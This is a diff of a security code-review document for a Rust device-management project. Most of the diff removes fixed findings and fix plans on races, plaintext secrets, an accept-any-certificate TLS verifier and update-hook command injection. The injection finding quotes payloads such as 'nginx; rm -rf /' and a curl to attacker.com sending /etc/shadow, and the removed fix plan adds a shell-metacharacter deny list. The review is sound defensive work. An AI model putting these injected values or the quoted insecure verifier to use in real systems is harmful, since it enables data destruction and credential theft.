@@ -24,69 +24,14 @@ Commit: `b855b6f`
 
 | Severity | Count | Key Themes |
 |----------|-------|------------|
-| **CRITICAL** | 6 (5 fixed) | First-user race, MQTT creds at rest, CA key exposure surface, tenant header bypass, TOFU verifier, logout authz bypass |
-| **HIGH** | 12 (5 fixed) | Command injection in hooks, merge without transaction, missing update ownership validation, missing cert lifetime cap, missing connection limits, DB schema gaps |
-| **MEDIUM** | 18 (7 fixed) | Race conditions in rate limiter / settings / leases, missing refresh token rotation, N+1 queries, SSRF vectors, settings desync, CRL gap |
+| **CRITICAL** | 1 | Logout authz bypass |
+| **HIGH** | 7 | Merge without transaction, missing cert lifetime cap, FK cascade gaps, MQTT lease race, EventPoller cursor gap, missing tenant scoping |
+| **MEDIUM** | 11 | Race conditions in leases, OIDC auto-link, N+1 queries, SSRF vectors, settings desync, CRL gap |
 | **LOW** | 16 | Missing validation, minor inconsistencies, defense-in-depth gaps |
 
 ---
 
 ## 1. Critical Findings
-
-### CR-1: Race condition in first-user owner role assignment — FIXED
-
-**Files:** `web-api/src/routes/auth.rs:86-136`, `web-api/src/routes/oidc_auth.rs:443-477`
-
-The "first user" check uses `User::find().count()` followed by role assignment without any transactional isolation. Two concurrent registration requests can both observe `count == 0` and both receive the `owner` role, granting full administrative access to both accounts.
-
-**Impact:** An attacker can race the first user registration to obtain owner privileges.
-
-**Fix plan:** [FP-CR1](#fp-cr1-atomic-first-user-registration) — **Implemented**: All three registration paths (password, OIDC callback, OIDC complete-registration) now wrap user creation + first-user check + role assignment in a single database transaction via `handle_first_user_setup()`.
-
-### CR-2: MQTT passwords stored and transmitted in plaintext — FIXED
-
-**Files:** `db/src/entity/mqtt_client.rs:16`, `web-api/src/routes/mqtt_ws.rs:491`, `notification_service.rs:71`
-
-MQTT broker passwords are:
-- Stored as `Option<String>` in the database with no encryption at rest
-- Transmitted to MQTT service instances in plaintext JSON over WebSocket
-- Written to the `controller_events` outbox table as serialized JSON (overlaps with wire CODEREVIEW A1)
-
-**Impact:** Database compromise exposes all MQTT broker credentials. Wire-level logging or proxy inspection reveals passwords.
-
-**Fix plan:** [FP-CR2](#fp-cr2-encrypt-sensitive-credentials-at-rest) — **Implemented**: All sensitive credentials (`mqtt_clients.password`, `oidc_providers.client_secret`, `ca_certificates.key_pem`) are now encrypted at rest using AES-256-GCM via the `EncryptedString` SeaORM custom type. A master encryption key (`UPTRAKIT_MASTER_KEY` or `--master-key-file`) is required in production; `--allow-plaintext-secrets` permits development-only startup without encryption at rest (warning logged).
-
-### CR-3: CA private keys in shared `CaSnapshotData` structure — FIXED
-
-**Files:** `controller/src/pki.rs:216-220`, `web-api/src/lib.rs:50-55`
-
-The `CaSnapshotData` contains both metadata (fingerprints, cert PEMs) and secrets (`active_key_pem`, `previous_key_pem`). This snapshot is broadcast via a `watch` channel to every component that holds a receiver, including `AppState` which is `Arc`-shared with all HTTP handlers. Additionally, CA private keys are stored unencrypted in the `ca_certificates` DB table.
-
-**Impact:** If any API handler accidentally serializes the snapshot, CA private keys leak. Database compromise yields all historical CA private keys.
-
-**Fix plan:** [FP-CR3](#fp-cr3-separate-ca-signing-material-from-metadata) — **Implemented**: `CaSnapshotData` split into `CaPublicSnapshot` (metadata only) and `CaKeyStore` (signing material with `Zeroizing` wrapper). CA private keys in DB are now encrypted via `EncryptedString`.
-
-### CR-4: Unauthenticated tenant context switching via header — FIXED
-
-**File:** `web-api/src/middleware/tenant_context.rs:29-51`
-
-The `TenantContext` extractor reads `X-Tenant-Id` from request headers with NO authorization check. Any client (authenticated or not) can set this header to any UUID. If multi-tenancy is ever enabled, this is a complete tenant isolation bypass.
-
-**Impact:** Currently limited (single-tenant mode), but becomes critical if multi-tenancy is activated.
-
-**Fix plan:** [FP-CR4](#fp-cr4-restrict-tenant-context-header) — **Implemented**: `X-Tenant-Id` header processing removed entirely. `TenantContext` always returns `state.default_tenant_id`. The header is also stripped by `strip_proxy_headers()` as defense-in-depth.
-
-### CR-5: TOFU TLS verifier accepts all certificates and signatures — FIXED
-
-**File:** `enrollment/src/tls.rs:115-174`
-
-The `AcceptAnyCert` verifier unconditionally returns success for `verify_server_cert`, `verify_tls12_signature`, AND `verify_tls13_signature`. This means it bypasses not just certificate chain validation but also handshake signature verification, enabling trivial MITM during TOFU enrollment.
-
-**Impact:** Active MITM during `--tofu` enrollment can inject a rogue CA, compromising all subsequent mTLS connections.
-
-**Mitigating factors:** `--tofu` is opt-in, conflicts with `--ca-cert` and `--pki-addr`, and is skipped if CA is already cached.
-
-**Fix plan:** [FP-CR5](#fp-cr5-strengthen-tofu-with-fingerprint-pinning) — **Implemented**: `AcceptAnyCert` replaced with `TofuVerifier` that delegates TLS signature verification to the installed crypto provider. Added `--tofu-fingerprint` CLI arg for SHA-256 fingerprint pinning. CLI client `--insecure` flag replaces hardcoded `tls_danger_accept_invalid_certs(true)`.
 
 ### CR-6: Logout endpoint accepts unauthenticated requests
 
@@ -102,16 +47,6 @@ The `logout` route is registered outside the `auth_routes` group (which has `req
 
 ## 2. High Findings
 
-### HI-1: Command injection in update hooks via admin-configurable parameters
-
-**File:** `web-api/src/update_hooks.rs:138-172`
-
-`resolve_systemd_hook()` directly interpolates `service_name` into a shell command (`systemctl {action} {service_name}`). Similarly, `resolve_docker_compose_hook()` interpolates `project_dir` and `compose_file`. A compromised admin account can set `service_name` to `nginx; rm -rf /`, achieving RCE on agents.
-
-**Impact:** Stored command injection executed on remote agents. Requires admin privileges but has unlimited blast radius.
-
-**Fix plan:** [FP-HI1](#fp-hi1-sanitize-hook-parameters) — **Implemented**: Two layers of defense: (1) Input validation at API boundary rejects shell metacharacters in hook parameters; (2) Predefined hooks now produce `HookCommand::Exec { program, args }` executed via `Command::new()` without shell interpretation. Custom commands remain shell-executed.
-
 ### HI-2: Service merge operation not wrapped in a transaction
 
 **File:** `web-api/src/routes/services.rs:455-635`
@@ -122,18 +57,6 @@ The merge operation performs sequential DB operations (deactivate source, revoke
 
 **Fix plan:** [FP-HI2](#fp-hi2-wrap-merge-in-transaction)
 
-### HI-3: No authorization check on update status messages from agents — FIXED
-
-**File:** `web-api/src/routes/agent_ws.rs:306-389`
-
-`UpdateStarted`, `UpdateOutput`, and `UpdateResult` handlers look up `update_history` records by ID without verifying the record belongs to a host linked to the authenticated agent. A compromised agent can manipulate status and output of updates belonging to other agents.
-
-**Impact:** Cross-agent update record tampering via UUID guessing (v7 UUIDs are time-ordered).
-
-> Also identified in wire CODEREVIEW as D2.
-
-**Fix plan:** See wire CODEREVIEW FP-17. — **Implemented**: `validate_update_ownership()` helper added that checks the `update_history` record's `host_id` against the agent's `linked_host_ids` set. All three update message handlers now call this validation before processing.
-
 ### HI-4: No maximum certificate lifetime enforcement in cert signer
 
 **File:** `controller/src/cert_signer.rs:28-29`
@@ -141,16 +64,6 @@ The merge operation performs sequential DB operations (deactivate source, revoke
 `sign_agent_csr()` accepts an arbitrary `time::Duration` with no upper bound. An extremely large duration would produce a certificate valid for decades.
 
 **Fix plan:** [FP-HI4](#fp-hi4-cap-certificate-lifetime)
-
-### HI-5: No maximum connection limit for WebSocket — FIXED
-
-**Files:** `web-api/src/service_connections.rs:55-90`, `web-api/src/routes/service_ws.rs:150-188`
-
-The `ServiceConnectionRegistry` accepts unlimited registrations. Combined with the lack of rate limiting on anonymous WebSocket upgrades, this creates an unbounded memory exhaustion vector.
-
-> Also identified in wire CODEREVIEW as S2.
-
-**Fix plan:** See wire CODEREVIEW FP-1, extended with a registry connection cap. — **Implemented**: `MAX_WS_MESSAGE_SIZE` (1 MB) applied. Per-IP connection rate limiting added at the WS endpoint (30/60s for connect, 10/300s for auth failure).
 
 ### HI-6: MQTT lease race condition — no DB-level locking
 
@@ -196,33 +109,9 @@ Queries agents by `host_id` without tenant filtering. In multi-tenant mode, agen
 
 **Fix plan:** [FP-HI10](#fp-hi10-add-tenant-filter-to-host-agents)
 
-### HI-11: No rate limiting on token refresh endpoint — FIXED
-
-**File:** `web-api/src/routes/auth.rs:382-443`
-
-The refresh endpoint is public and has no dedicated rate limiting. An attacker with a stolen refresh token could rapidly generate access tokens.
-
-**Fix plan:** [FP-HI11](#fp-hi11-rate-limit-refresh-endpoint) — **Implemented**: `/api/v1/auth/refresh` added to the `RATE_LIMITS` map at 10 requests per 60 seconds.
-
-### HI-12: OIDC client_secret stored in plaintext — FIXED
-
-**File:** `db/src/entity/oidc_provider.rs:71`, `controller/src/main.rs:388`
-
-The OIDC client secret is stored as a bare string in the database. Database compromise exposes all OIDC client secrets.
-
-**Fix plan:** [FP-CR2](#fp-cr2-encrypt-sensitive-credentials-at-rest) (combined) — **Implemented**: Addressed by FP-CR2 — OIDC client secrets are now encrypted at rest via `EncryptedString`.
-
 ---
 
 ## 3. Medium Findings
-
-### ME-1: No refresh token rotation on use — FIXED
-
-**File:** `web-api/src/auth/session.rs:62-92`
-
-When a refresh token is used, it is NOT rotated. If stolen, it remains usable for its full 7-day lifetime even after the legitimate user refreshes.
-
-**Fix plan:** [FP-ME1](#fp-me1-implement-refresh-token-rotation) — **Implemented**: `rotate_refresh_token()` method added to `SessionService` that atomically revokes the old session and creates a new one with a fresh token. Replay detection revokes all user sessions on reuse of a revoked token.
 
 ### ME-2: OIDC auto-link without email verification
 
@@ -231,14 +120,6 @@ When a refresh token is used, it is NOT rotated. If stolen, it remains usable fo
 The `AutoLink` branch auto-links OIDC identity to an existing user based solely on email match. If the OIDC provider doesn't verify email addresses, this enables account takeover.
 
 **Fix plan:** [FP-ME2](#fp-me2-check-email-verified-before-auto-link)
-
-### ME-3: TOCTOU race in rate limit check — FIXED
-
-**File:** `web-api/src/auth/rate_limit.rs:62-106`
-
-The read-then-update pattern allows concurrent requests to both pass the limit check before either increments the counter.
-
-**Fix:** Replaced with a single atomic `INSERT ... ON CONFLICT DO UPDATE SET request_count = CASE WHEN ... END` statement. The separate `upsert_new_window` method was removed. All rate limit operations are now single atomic SQL statements.
 
 ### ME-4: Rate limit fails open on database error
 
@@ -252,27 +133,11 @@ Database outage completely disables rate limiting, allowing unrestricted brute-f
 
 The `/api/v1/auth/device/approve` endpoint is not rate-limited (user code brute-force risk) and any authenticated user can approve device flows regardless of permissions.
 
-### ME-6: JWT-authenticated requests don't check user active status — FIXED
-
-**File:** `web-api/src/middleware/require_auth.rs:126-156`
-
-The JWT path trusts claims without a database check. A deactivated user's JWT remains valid for up to 15 minutes. The API token path correctly checks `is_active`.
-
-**Fix:** Added in-memory `TokenDenylist` supporting per-JTI and per-user revocation with auto-expiry. The `authenticate_jwt` middleware checks the denylist on every request. On logout/deactivation, all tokens for the user are denied for the remaining access token lifetime.
-
 ### ME-7: N+1 query patterns in list endpoints
 
 **Files:** `web-api/src/routes/hosts.rs:87-91`, `software_items.rs:356-374`, `update_history.rs:194-199`
 
 `list_hosts` issues an individual query per host (up to 1000). Same patterns in software items and update history.
-
-### ME-8: Non-atomic settings reload across HA instances — FIXED
-
-**File:** `web-api/src/settings.rs:232-281`
-
-`reload_from_db()` acquires/releases locks on each setting individually. Readers can observe partially-updated state between lock releases.
-
-**Fix:** Replaced 6 independent `RwLock`s with a `tokio::sync::watch` channel holding an atomic `SettingsSnapshot`. All reader methods are now synchronous. Writers use a `Mutex` to serialize modifications and publish via `send_modify()`. Version counter loads use `Ordering::Acquire`.
 
 ### ME-9: SSRF vector in GitHub provider via `api_base_url`
 
@@ -286,14 +151,6 @@ User-provided `api_base_url` is directly used in API requests without scheme val
 
 `service` and `scope` values from the `WWW-Authenticate` header are appended without URL encoding, enabling parameter injection by a malicious registry.
 
-### ME-11: OIDC redirect URL constructed from client-supplied headers — FIXED
-
-**File:** `web-api/src/routes/oidc_auth.rs:1182-1196`
-
-When `ExternalBaseUrl` is not configured, the `Origin` or `Host` header is used to construct OIDC redirect URLs. An attacker can redirect OIDC callbacks to their domain.
-
-**Fix:** `Origin` header is now only trusted from requests identified as coming from a trusted proxy. Added `origin` to `strip_proxy_headers()` for non-proxy requests. Spoofed `Origin` from untrusted clients falls back to `Host` header.
-
 ### ME-12: CRL `next_update` creates 24-hour revocation visibility gap
 
 **File:** `controller/src/crl_manager.rs:295`
@@ -305,22 +162,6 @@ CRL clients cache until `next_update` (24h). Revoking a certificate has no effec
 **File:** `web-api/src/mqtt_client_store.rs:88-91`
 
 Count-then-insert pattern allows concurrent requests to exceed the configured maximum.
-
-### ME-14: Settings version bump race in concurrent writes — FIXED
-
-**File:** `web-api/src/settings_store.rs:127-172`
-
-Two concurrent first-time writes for a new tenant can both attempt to insert into `settings_version`, causing a unique constraint violation.
-
-**Fix:** Replaced read-then-write pattern with `INSERT ... ON CONFLICT DO UPDATE` upsert via SeaORM's `on_conflict` builder. The defensive inserts in `bump_settings_version` and `bump_revocation_version` now use `on_conflict` with `do_nothing` via `try_insert()`.
-
-### ME-15: Server key file written without restricted permissions — FIXED
-
-**Files:** `controller/src/pki.rs:713-714`, `web-api/src/routes/server_cert.rs:137-140`
-
-`std::fs::write()` uses the default umask. The private key file could be world-readable on permissive systems.
-
-**Fix:** Uses `uptrakit_directories::write_secure_file_str()` (0o600 permissions) to write temp files, then `std::fs::rename()` for atomic replacement.
 
 ### ME-16: Registration settings desync across HA instances
 
@@ -484,441 +325,7 @@ These aspects demonstrate strong engineering practices:
 
 ## Fix Plans
 
-> **Complete Coverage** — Forty-five implementation-ready fix plans below cover all 52 findings: 6 Critical, 12 High, 18 Medium, and 16 Low. Additionally, 5 issues (HI-3, HI-5, HI-6, HI-7, ME-17) have fix plans in the wire protocol CODEREVIEW.
-
----
-
-### FP-CR1: Atomic first-user registration (TOP 5 — #1) — IMPLEMENTED
-
-**Addresses:** CR-1 (Critical — privilege escalation via race condition)
-
-**Problem:** The first-user registration check uses `User::find().count()` followed by a separate user insert and role assignment with NO transactional isolation. Two concurrent registration requests can both observe `count == 0` and both receive the `owner` role, granting full administrative access to an attacker who races the first legitimate registration.
-
-Additionally, the password path checks `count == 0` *before* creating the user, while the OIDC path checks `count == 1` *after* creating the user — an inconsistency that creates different race windows.
-
-**Current code flow (password path in `web-api/src/routes/auth.rs:86-136`):**
-```
-1. let user_count = User::find().count(&state.db).await     // read
-2. let is_first_user = user_count == 0                        // decide
-3. new_user.insert(&state.db).await                           // write (separate operation)
-4. if is_first_user { assign_owner_role(&state.db, ...) }     // write (separate operation)
-5. complete_initial_setup(...)                                 // write (separate operation)
-```
-
-**Current code flow (OIDC path in `web-api/src/routes/oidc_auth.rs:443-477`):**
-```
-1. resolve_oidc_user() → creates user + assigns "user" role   // write
-2. let is_first_user = User::find().count() == 1              // read (AFTER creation)
-3. if is_first_user { delete "user" role, assign "owner" }    // write (separate)
-4. complete_initial_setup(...)                                 // write (separate)
-```
-
-**Detailed implementation plan:**
-
-1. **Extract a shared `register_first_user()` helper** used by both password and OIDC paths:
-   ```rust
-   /// Atomically registers the first user with owner role.
-   /// Returns Ok(true) if this was the first user, Ok(false) otherwise.
-   async fn register_first_user(
-       db: &DatabaseConnection,
-       tenant_id: Uuid,
-       user_id: Uuid,
-       settings: &SettingsManager,
-   ) -> Result<bool> { ... }
-   ```
-
-2. **Wrap in a serializable transaction:**
-   - `db.begin_with_config(Some(IsolationLevel::Serializable), None).await`
-   - Inside: count users, create user, assign owner role, call `complete_initial_setup` (which sets `registration.mode = Closed` and deletes the invite token).
-   - `txn.commit().await` — if a concurrent transaction already committed, this will fail with a serialization error.
-
-3. **Add a database-level guard:** Add a unique partial index or constraint on `settings(tenant_id, key)` WHERE `key = 'registration.mode'` AND `value = '"Open"'`. This makes `complete_initial_setup`'s `Closed` write act as a natural mutex — the second racer's transaction fails at commit.
-
-4. **Unify the two paths:** Both password and OIDC registration call the same `register_first_user()` helper. The OIDC path no longer creates the user with a "user" role first, then replaces it; instead it calls the helper directly.
-
-5. **Handle the serialization-error retry:** On `DbErr::...` serialization failure, return `409 Conflict` with "Registration is being processed, please retry" instead of a 500.
-
-**Files to modify:**
-- `crates/ui/web-api/src/routes/auth.rs` — extract helper, wrap in transaction
-- `crates/ui/web-api/src/routes/oidc_auth.rs` — use shared helper
-- `crates/ui/web-api/src/auth/authentication.rs` — adjust `resolve_oidc_user` to not assign role if first-user flow will handle it
-- `crates/ui/web-api/src/auth/registration.rs` — make `complete_initial_setup` accept a transaction connection
-
-**Testing:**
-- Unit test: concurrent registration attempts (spawn multiple tasks hitting register simultaneously)
-- Verify only one user gets owner role
-- Verify registration mode switches to Closed atomically
-
----
-
-### FP-HI1: Eliminate command injection in update hooks (TOP 5 — #2) — IMPLEMENTED
-
-**Addresses:** HI-1 (High — stored RCE on remote agents)
-
-**Problem:** `resolve_systemd_hook()` and `resolve_docker_compose_hook()` in `web-api/src/update_hooks.rs` directly interpolate admin-configurable strings (`service_name`, `project_dir`, `compose_file`) into shell commands using `format!()`. These commands are executed by agents via `sh -c`. A compromised admin account (or CSRF/XSS leading to admin config change) can inject arbitrary shell commands that execute on every managed agent.
-
-**Current vulnerable code:**
-```rust
-// update_hooks.rs:138-140
-fn resolve_systemd_hook(hook: &SystemdServiceHook) -> String {
-    format!("systemctl {} {}", hook.action.as_str(), hook.service_name)
-    // service_name = "nginx; curl attacker.com/$(cat /etc/shadow)"
-    // → "systemctl stop nginx; curl attacker.com/$(cat /etc/shadow)"
-}
-
-// update_hooks.rs:143-172
-fn resolve_docker_compose_hook(hook: &DockerComposeHook) -> String {
-    // project_dir and compose_file also directly interpolated
-    parts.push(format!("cd {project_dir}"));
-    compose_cmd.push_str(&format!(" -f {compose_file}"));
-    // ...
-}
-```
-
-**No validation exists** at any layer — the types in `web-api-types/src/update_hooks.rs` accept bare `String` fields, and the API routes in `provider_configs.rs` and `software_items.rs` pass them through without sanitization.
-
-**Detailed implementation plan:**
-
-1. **Switch to structured command execution (primary fix):**
-   Change hook resolution from producing a single shell string to producing a structured `ResolvedCommand`:
-   ```rust
-   pub struct ResolvedCommand {
-       pub program: String,
-       pub args: Vec<String>,
-       pub working_dir: Option<String>,
-   }
-   ```
-   - `resolve_systemd_hook` → `ResolvedCommand { program: "systemctl", args: vec![action, service_name], working_dir: None }`
-   - `resolve_docker_compose_hook` → `ResolvedCommand { program: "docker-compose", args: vec!["-f", compose_file, action, ...], working_dir: Some(project_dir) }`
-
-2. **Update the wire protocol** to transmit `ResolvedCommand` instead of a bare string. The agent executes via `Command::new(program).args(args).current_dir(working_dir)` — never via `sh -c`.
-
-3. **Add input validation at the API boundary** (defense in depth):
-   Add a `validate_hook_params()` function in `web-api-types/src/update_hooks.rs`:
-   ```rust
-   /// Validates hook parameters reject shell metacharacters.
-   /// Allowed: alphanumeric, `-`, `_`, `.`, `/` (for paths).
-   fn validate_safe_identifier(value: &str, field: &str) -> Result<()> {
-       if value.is_empty() { return Err(...) }
-       if value.len() > 255 { return Err(...) }
-       let forbidden = [';', '&', '|', '$', '`', '(', ')', '{', '}', '<', '>', '\'', '"', '\\', '\n', '\r', '\0'];
-       if value.chars().any(|c| forbidden.contains(&c)) {
-           return Err(format!("{field} contains forbidden characters"));
-       }
-       Ok(())
-   }
-   ```
-   - Apply to `service_name` (stricter: only `[a-zA-Z0-9._@-]`, matching systemd unit name rules)
-   - Apply to `project_dir` and `compose_file` (path characters only: `[a-zA-Z0-9._/-]`)
-
-4. **Call validation in API routes:**
-   - `crates/ui/web-api/src/routes/provider_configs.rs` — validate hook params in `create_provider_config` and `update_provider_config`
-   - `crates/ui/web-api/src/routes/software_items.rs` — validate hook params in `create_software_item` and `update_software_item` (config override)
-
-5. **Agent-side change:** Update agent's command executor to use `Command::new()` with the structured args instead of `sh -c <string>`.
-
-**Files to modify:**
-- `crates/ui/web-api/src/update_hooks.rs` — new `ResolvedCommand` struct, rewrite resolution functions
-- `crates/shared/web-api-types/src/update_hooks.rs` — add validation functions
-- `crates/shared/wire/src/lib.rs` — update wire message to carry structured commands
-- `crates/ui/web-api/src/routes/provider_configs.rs` — call validation
-- `crates/ui/web-api/src/routes/software_items.rs` — call validation, update trigger_update
-- `crates/core/agent/` — update command executor
-- `crates/shared/wire/asyncapi.yaml` — update schema
-
-**Testing:**
-- Unit test: validation rejects `;`, `|`, `$()`, backticks, etc.
-- Unit test: `ResolvedCommand` produces correct program/args
-- Integration test: hook execution with special characters is safely handled
-
----
-
-### FP-CR2: Encrypt sensitive credentials at rest (TOP 5 — #3) — IMPLEMENTED
-
-**Addresses:** CR-2 (Critical — MQTT password exposure), HI-12 (High — OIDC secret exposure)
-
-**Problem:** Three categories of secrets are stored as plaintext strings in the database:
-- `mqtt_clients.password` (`Option<String>`) — MQTT broker credentials
-- `oidc_providers.client_secret` (`String`) — OIDC client secrets
-- `ca_certificates.key_pem` (`String`) — CA private keys (PEM)
-
-A database compromise (SQL injection in a dependency, backup leak, stolen disk) exposes all secrets. MQTT passwords are also transmitted in plaintext JSON over WebSocket in `MqttTenantConfig` messages and serialized into the `controller_events` outbox table.
-
-**Detailed implementation plan:**
-
-1. **Create a `SecretString` newtype** in the `db` crate:
-   ```rust
-   /// A string that is encrypted at rest in the database.
-   /// Stored as `ENC:v1:<base64(nonce ‖ ciphertext ‖ tag)>`.
-   /// Implements `Display` as `***REDACTED***` to prevent accidental logging.
-   #[derive(Clone)]
-   pub struct SecretString(String);
-
-   impl std::fmt::Debug for SecretString {
-       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-           f.write_str("SecretString(***)")
-       }
-   }
-
-   impl std::fmt::Display for SecretString {
-       fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-           f.write_str("***REDACTED***")
-       }
-   }
-   ```
-
-2. **Implement encryption module** (`crates/shared/db/src/crypto.rs` or a new shared crate):
-   - Algorithm: AES-256-GCM (via the `aes-gcm` crate, already widely audited)
-  - Master key: 32-byte key loaded from `UPTRAKIT_MASTER_KEY` env var or `--master-key-file` path at startup (production requirement; `--allow-plaintext-secrets` permits dev-only startup without encryption at rest)
-   - Format: `ENC:v1:<base64(12-byte-nonce ‖ ciphertext ‖ 16-byte-tag)>`
-   - Functions:
-     ```rust
-     pub fn encrypt(master_key: &[u8; 32], plaintext: &str) -> String
-     pub fn decrypt(master_key: &[u8; 32], stored: &str) -> Result<String>
-     pub fn is_encrypted(stored: &str) -> bool  // checks "ENC:v1:" prefix
-     ```
-
-3. **Implement SeaORM `Value` conversion** for `SecretString`:
-   - `From<SecretString> for Value` → calls `encrypt()` before storing
-   - `TryGetable for SecretString` → calls `decrypt()` after reading
-   - This makes encryption transparent to all entity code
-
-4. **Update entity models:**
-   - `mqtt_client.rs`: Change `password: Option<String>` to `password: Option<SecretString>`
-   - `oidc_provider.rs`: Change `client_secret: String` to `client_secret: SecretString`
-   - `ca_certificate` entity (if one exists) or the CA store: Change `key_pem: String` to `key_pem: SecretString`
-
-5. **Write a migration** to encrypt existing plaintext values:
-   - Read all rows with plaintext secrets
-   - Encrypt each with the master key
-   - Update in-place
-  - If `UPTRAKIT_MASTER_KEY` is not set and `--allow-plaintext-secrets` is used, the controller logs a warning and runs without encryption at rest (development only)
-
-6. **Update wire protocol:** Ensure `MqttTenantConfig.password` is decrypted before being sent to the MQTT service (the wire message goes over mTLS, so plaintext in-transit is acceptable for the mTLS channel).
-
-7. **Ensure secrets never appear in:**
-   - API responses (already masked — verify)
-   - `controller_events` outbox table (audit the event serialization)
-   - Tracing/log output (the `Debug`/`Display` impls prevent this)
-
-**Files to modify:**
-- New: `crates/shared/db/src/crypto.rs` (encryption module)
-- `crates/shared/db/src/entity/mqtt_client.rs` — `SecretString` field
-- `crates/shared/db/src/entity/oidc_provider.rs` — `SecretString` field
-- `crates/shared/db/Cargo.toml` — add `aes-gcm`, `base64` dependencies
-- `crates/core/controller/src/main.rs` — load master key at startup
-- `crates/ui/web-api/src/mqtt_lease_coordinator.rs` — decrypt before wire transmission
-- New migration for encrypting existing data
-- All stores that read/write these fields (should work transparently via SeaORM)
-
-**Testing:**
-- Unit test: round-trip encrypt/decrypt
-- Unit test: `SecretString` Debug/Display never reveals plaintext
-- Unit test: `is_encrypted` correctly identifies encrypted vs plaintext
-- Integration test: create MQTT client with password → verify DB stores encrypted value → verify API returns working password
-
----
-
-### FP-CR3: Separate CA signing material from metadata (TOP 5 — #4) — IMPLEMENTED
-
-**Addresses:** CR-3 (Critical — CA private key exposure surface)
-
-**Problem:** `CaSnapshotData` is a single struct containing both public metadata (fingerprints, cert PEMs, bundle, pki_addr) and private secrets (`active_key_pem`, `previous_key_pem`, `trusted_cas[].key_pem`). This struct is broadcast via a `tokio::sync::watch` channel to every component that holds a receiver — including `AppState` which is `Arc`-shared with all HTTP handlers via Axum's state extraction.
-
-The current data flow:
-```
-pki.rs::to_snapshot()
-  → watch::channel(CaSnapshotData)      ← contains ALL private keys
-     ├── AppState.ca_snapshot            ← every HTTP handler can read private keys
-     ├── CertSigner.ca_rx               ← needs active key only
-     └── CrlManager                     ← needs all trusted keys for CRL signing
-```
-
-If any API handler accidentally calls `serde_json::to_string(&snapshot)`, or if a future developer adds debug logging, all CA private keys leak.
-
-**Detailed implementation plan:**
-
-1. **Split into two structs:**
-   ```rust
-   /// Safe to share with all components. No secret material.
-   pub struct CaMetadata {
-       pub active_cert_pem: String,
-       pub active_fingerprint: String,
-       pub previous_cert_pem: Option<String>,
-       pub previous_fingerprint: Option<String>,
-       pub trusted_ca_certs: Vec<TrustedCaCert>,  // cert + fingerprint only, NO key
-       pub trusted_ca_cns: Vec<String>,
-       pub bundle_pem: String,
-       pub bundle_hash: String,
-       pub managed: bool,
-       pub active_not_after: time::OffsetDateTime,
-       pub pki_addr: Option<String>,
-   }
-
-   pub struct TrustedCaCert {
-       pub cert_pem: String,
-       pub fingerprint: String,
-       pub not_after: time::OffsetDateTime,
-   }
-
-   /// Secret material. Only accessible to signing components.
-   pub struct CaSigningKeys {
-       pub active_key_pem: String,
-       pub trusted_keys: Vec<TrustedCaKey>,  // fingerprint → key mapping
-   }
-
-   pub struct TrustedCaKey {
-       pub fingerprint: String,
-       pub key_pem: String,
-       pub cert_pem: String,  // needed to build Issuer
-       pub not_after: time::OffsetDateTime,
-   }
-   ```
-
-2. **Create two separate watch channels in `main.rs`:**
-   ```rust
-   let (ca_meta_tx, ca_meta_rx) = watch::channel(ca_metadata);
-   let (ca_keys_tx, ca_keys_rx) = watch::channel(ca_signing_keys);
-   ```
-
-3. **Update `AppState`** to only hold the metadata receiver:
-   ```rust
-   pub struct AppState {
-       pub ca_metadata: watch::Receiver<CaMetadata>,  // NO private keys
-       // ...
-   }
-   ```
-
-4. **Update `CertSigner`** to hold the signing keys receiver:
-   ```rust
-   pub struct RcgenAgentCertSigner {
-       ca_keys: watch::Receiver<CaSigningKeys>,
-   }
-   ```
-
-5. **Update `CrlManager`** to take signing keys directly:
-   - Constructor: `CrlManager::new(config, &ca_metadata, &ca_signing_keys)` — parses keys into `Issuer` objects immediately
-   - `update_ca()` method: accepts `(&CaMetadata, &CaSigningKeys)` pair
-
-6. **Update `pki.rs`:**
-   - Replace `to_snapshot()` with `to_metadata()` + `to_signing_keys()`
-   - Update all broadcast sites (CA reload task, CA rotation task) to send to both channels
-
-7. **Update HTTP handlers** that currently access `state.ca_snapshot`:
-   - Any handler reading cert PEMs, fingerprints, bundle → use `state.ca_metadata`
-   - No handler should need private keys
-
-8. **Remove `Serialize` from `CaSigningKeys`** (if present) to make accidental serialization a compile error.
-
-**Files to modify:**
-- `crates/ui/web-api/src/lib.rs` — split `CaSnapshotData`, update `AppState`
-- `crates/core/controller/src/pki.rs` — split `to_snapshot()`, update broadcast
-- `crates/core/controller/src/cert_signer.rs` — use `CaSigningKeys`
-- `crates/core/controller/src/crl_manager.rs` — accept split types
-- `crates/core/controller/src/main.rs` — create two channels, wire up
-
-**Testing:**
-- Compile-time: verify `CaSigningKeys` has no `Serialize` impl
-- Unit test: `CaMetadata` contains no `key_pem` fields
-- Existing cert signing and CRL tests should pass with the split
-
----
-
-### FP-CR5: Strengthen TOFU with signature verification and fingerprint pinning (TOP 5 — #5) — IMPLEMENTED
-
-**Addresses:** CR-5 (Critical — MITM during enrollment)
-
-**Problem:** The `AcceptAnyCert` verifier in `enrollment/src/tls.rs:115-174` unconditionally returns success for `verify_server_cert`, `verify_tls12_signature`, AND `verify_tls13_signature`. This doesn't just skip certificate chain validation — it also bypasses handshake signature verification, meaning an attacker doesn't even need a valid private key to impersonate the server. During `--tofu` enrollment, a MITM can inject a rogue CA certificate, compromising all subsequent mTLS connections.
-
-Additionally, the CLI client (`crates/ui/cli/src/client.rs:13`) has a hardcoded `tls_danger_accept_invalid_certs(true)` that is always active — not just for TOFU.
-
-**Current `AcceptAnyCert` code:**
-```rust
-impl ServerCertVerifier for AcceptAnyCert {
-    fn verify_server_cert(...) -> Result<ServerCertVerified, Error> {
-        Ok(ServerCertVerified::assertion())  // accepts ANY cert
-    }
-    fn verify_tls12_signature(...) -> Result<HandshakeSignatureValid, Error> {
-        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
-    }
-    fn verify_tls13_signature(...) -> Result<HandshakeSignatureValid, Error> {
-        Ok(HandshakeSignatureValid::assertion())  // accepts ANY signature
-    }
-}
-```
-
-**Detailed implementation plan:**
-
-1. **Replace `AcceptAnyCert` with `TofuVerifier`** that validates signatures but not chain:
-   ```rust
-   #[derive(Debug)]
-   struct TofuVerifier;
-
-   impl ServerCertVerifier for TofuVerifier {
-       fn verify_server_cert(
-           &self, end_entity: &CertificateDer<'_>, _intermediates: &[CertificateDer<'_>],
-           _server_name: &ServerName<'_>, _ocsp: &[u8], _now: UnixTime,
-       ) -> Result<ServerCertVerified, Error> {
-           // Accept any certificate (we don't know the CA yet)
-           // BUT we DO verify the TLS handshake signatures below
